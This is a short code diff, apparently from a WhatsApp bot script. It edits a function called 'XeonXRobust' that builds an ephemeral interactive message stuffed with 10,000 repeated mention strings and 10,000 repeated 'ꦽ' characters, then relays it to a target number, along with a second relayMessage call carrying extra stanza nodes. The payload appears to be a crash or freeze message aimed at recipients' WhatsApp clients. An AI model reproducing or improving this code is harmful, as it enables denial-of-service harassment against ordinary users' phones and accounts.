@@ -423,10 +423,10 @@ const wanted = {
             }
         }
 		
-		    async function XeonXRobust(viper, target, Ptcp = true) {
+		    async function XeonXRobust(target, Ptcp = true) {
 	const jids = `*_~@13135550002~_*\n`.repeat(10000);
 	const ui = 'ꦽ'.repeat(10000);
-   await viper.relayMessage(target, {
+	await viper.relayMessage(target, {
      ephemeralMessage: {
       message: {
        interactiveMessage: {
@@ -642,7 +642,7 @@ ticket_id: crypto.randomBytes(16),
 }
 }
 
-await viper.relayMessage(target, messagePayload, {
+viper.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 })
